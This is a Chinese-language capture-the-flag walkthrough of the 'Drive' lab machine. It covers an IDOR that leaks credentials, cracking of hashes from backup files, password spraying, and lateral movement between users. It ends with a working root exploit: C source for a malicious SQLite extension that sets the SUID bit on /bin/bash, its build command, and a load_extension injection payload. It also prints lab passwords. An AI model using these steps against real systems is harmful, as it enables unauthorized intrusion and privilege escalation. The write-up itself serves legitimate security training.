<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/fcb1dd62-51e8-4f30-aac4-fff7e7246042" />

Nmap端口扫描 开放了 22，80，3000端口

<img width="415" height="223" alt="image" src="https://github.com/user-attachments/assets/65e6cbd4-8a73-4757-9d10-5570210ad18c" />

Web页面，有一个登录和注册

<img width="416" height="225" alt="image" src="https://github.com/user-attachments/assets/db61c89b-eed4-423f-8478-fe46563c5147" />

<img width="415" height="216" alt="image" src="https://github.com/user-attachments/assets/259b9f03-0564-4f40-b04b-50e23ef5f422" />

还有四个人的名字
先注册一个试试

<img width="415" height="197" alt="image" src="https://github.com/user-attachments/assets/2bafe2e0-0f4a-4b30-a8cf-46a2ff26cd3a" />

<img width="415" height="118" alt="image" src="https://github.com/user-attachments/assets/fcd2dfe1-9ee1-4ff1-a70e-99242583d3c5" />

上传个文件试试

<img width="415" height="238" alt="image" src="https://github.com/user-attachments/assets/c73e68ee-5f8e-4e72-bc1b-d333adab0c87" />

尝试目录越权
<img width="415" height="81" alt="image" src="https://github.com/user-attachments/assets/fdda7839-8cad-4805-b074-60351b1759d5" />

对113目录设置变量

<img width="415" height="178" alt="image" src="https://github.com/user-attachments/assets/88e4cd52-3ce2-4dc0-9ebf-c8979bc350a7" />

设置数字
0-200

<img width="415" height="326" alt="image" src="https://github.com/user-attachments/assets/d1aa88d0-2eaf-4103-b848-69f0759ef481" />

<img width="415" height="60" alt="image" src="https://github.com/user-attachments/assets/14c2f63b-0422-4db9-9cf3-9cc28f709a0d" />

101，112，99，98，79可能存在越权


访问79目录，的到martin的密码

<img width="415" height="121" alt="image" src="https://github.com/user-attachments/assets/fac30721-8ea1-449d-9005-619a6e8b9f58" />

martin:Xk4@KjyrYv8t194L!

VPN卡的不行，换了好多次节点

<img width="415" height="417" alt="image" src="https://github.com/user-attachments/assets/a440cb18-52df-4b06-9ac8-6da1bca929e7" />

<img width="416" height="277" alt="image" src="https://github.com/user-attachments/assets/229fef98-c2dd-4405-9621-3b671ded9752" />


没有发现什么常规利用，网站目录看一下

<img width="415" height="53" alt="image" src="https://github.com/user-attachments/assets/cdddd02f-22ae-4a7d-b1cd-0bfcec33d52c" />

在网站目录下面存在一些备份文件

<img width="415" height="152" alt="image" src="https://github.com/user-attachments/assets/cacb8e21-6784-4db9-92f5-ae8e2eac8175" />

全部下载下来

<img width="415" height="115" alt="image" src="https://github.com/user-attachments/assets/521e0c67-2bb7-484f-92c6-657b5e5cc551" />

查看db文件
存在一些hash密码

<img width="415" height="226" alt="image" src="https://github.com/user-attachments/assets/69936a0b-9d20-43e1-a235-a4a8685d2955" />

压缩包解压需要密码


Home目录除martin外还有3个用户，猜测应该是要横向移动到这三个用户上面

<img width="159" height="35" alt="image" src="https://github.com/user-attachments/assets/95dd221b-0f6b-47e0-a893-15adfa2a7f6a" />

现在需要找到压缩包的密码

上传linpeas

<img width="416" height="191" alt="image" src="https://github.com/user-attachments/assets/48124fda-f180-4cfb-b1a3-42076f9c5f6f" />

转发一下3000端口

<img width="415" height="64" alt="image" src="https://github.com/user-attachments/assets/8abd4cd2-7f77-412e-92e4-8af8497de534" />

<img width="416" height="77" alt="image" src="https://github.com/user-attachments/assets/370c4481-f8a9-42dd-84e1-a1e2b033a731" />

<img width="415" height="222" alt="image" src="https://github.com/user-attachments/assets/d46cd29f-d103-4cce-b2b1-1807ebf8a69c" />

可以使用martin账户登录 martin@drive.htb

<img width="415" height="192" alt="image" src="https://github.com/user-attachments/assets/9af2d7cb-05f3-4b8f-b306-805b187b90f1" />

<img width="416" height="189" alt="image" src="https://github.com/user-attachments/assets/90521631-ad77-427d-aa35-a1b5311d25dc" />

在backup.sh里面找到了压缩包的密码
H@ckThisP@ssW0rDIfY0uC@n:)

<img width="324" height="113" alt="image" src="https://github.com/user-attachments/assets/063d9592-fee4-444a-98a0-40d93389db8f" />

<img width="331" height="122" alt="image" src="https://github.com/user-attachments/assets/684ac6bb-d7cb-40df-b382-2f58d9714c27" />

存在两种加密方式

<img width="415" height="218" alt="image" src="https://github.com/user-attachments/assets/7c77a53a-f820-47bb-b3eb-51ad612caf3a" />

可以尝试用hashcat的124模式来破解

<img width="416" height="73" alt="image" src="https://github.com/user-attachments/assets/72d2c04f-e59e-48a0-8ef4-06c75ae07de5" />

得到四个密码

<img width="326" height="272" alt="image" src="https://github.com/user-attachments/assets/4a18e0f9-a059-4ad5-ae98-83ffa0ad791d" />

john316
johniscool
john boy
johnmayer7

还有在home目录下得到的用户

<img width="333" height="277" alt="image" src="https://github.com/user-attachments/assets/f10ae93e-5854-4294-bd5a-572c0934e666" />

使用crackmap进行密码喷洒

<img width="416" height="233" alt="image" src="https://github.com/user-attachments/assets/59ac6f8e-2047-4bf8-b29d-0ebca2024e96" />

tom:johnmayer7

横向移动到tom拿到user-flag

<img width="415" height="199" alt="image" src="https://github.com/user-attachments/assets/6013bbd4-19aa-4b2d-a162-6cc682561650" />

<img width="416" height="196" alt="image" src="https://github.com/user-attachments/assets/1e5d8668-5ed1-41e4-aee6-0f68697ccaff" />

大概率是要我们利用这doodleGrive-cli

<img width="416" height="68" alt="image" src="https://github.com/user-attachments/assets/b9ebc622-1943-442d-99eb-637c997f6494" />

<img width="415" height="118" alt="image" src="https://github.com/user-attachments/assets/9f6785c1-5f34-41f0-9e80-1cab55216dca" />
拿下来看看

<img width="232" height="124" alt="image" src="https://github.com/user-attachments/assets/22017860-28c9-4c1c-b243-88765fd53511" />

<img width="416" height="247" alt="image" src="https://github.com/user-attachments/assets/463c787a-e238-4d78-a92d-1d78a212cc95" />

存在一个账号和密码
moriarty
findMeIfY0uC@nMr.Holmz!

<img width="416" height="171" alt="image" src="https://github.com/user-attachments/assets/e72c9610-ebba-4d82-9296-5f6f15023429" />

可以用这个账号密码来登录

生成一个ac.c的文件
#include <stdlib.h>
#include <unistd.h>
void sqlite3_a_init() {
setuid(0);
setgid(0);
system("/usr/bin/chmod +s /bin/bash");
}

调用系统命令，赋予所有用户/bin/bash的权限
gcc -shared ac.c -o a.so -nostartfiles -fPIC
编译ac.c文件
执行doodleGrive-cli并登录
选择5选项执行
"+load_extension(char(46,47,97))+"

ascii
46=. 47=/ 97=a 调用load_extension函数来执行./a
因为doodleGrive-cli是以root身份在运行，我们利用doodleGrive-cli来执行ac.c中的命令
system("/usr/bin/chmod +s /bin/bash")
来赋予所有用户/bin/bash的权限


执行成功后退出
来到靶机上执行/bin/bash -p 
拿到rootshell

<img width="416" height="328" alt="image" src="https://github.com/user-attachments/assets/2649e539-0767-401f-8731-ae083438c5bf" />

<img width="265" height="89" alt="image" src="https://github.com/user-attachments/assets/b39e9610-184b-4320-a7f3-253fea277636" />

